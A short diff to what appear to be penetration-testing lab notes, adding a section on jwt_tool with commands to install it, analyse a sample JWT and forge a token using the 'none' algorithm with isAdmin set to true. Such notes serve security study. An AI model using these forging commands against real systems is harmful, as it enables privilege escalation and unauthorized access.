@@ -199,3 +199,20 @@ python3 exploit.py
 # resend landing page request with generated JWT
 ```
 
+### jwt_tool
+
+```bash
+# install
+git clone https://github.com/ticarpi/jwt_tool
+pip3 install -r requirements.txt
+python3 jwt_tool/jwt_tool.py -h
+
+# analyse token
+python3 jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
+
+# create a token that uses none alg and updates payload
+python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
+```
+
+## OAuth
+
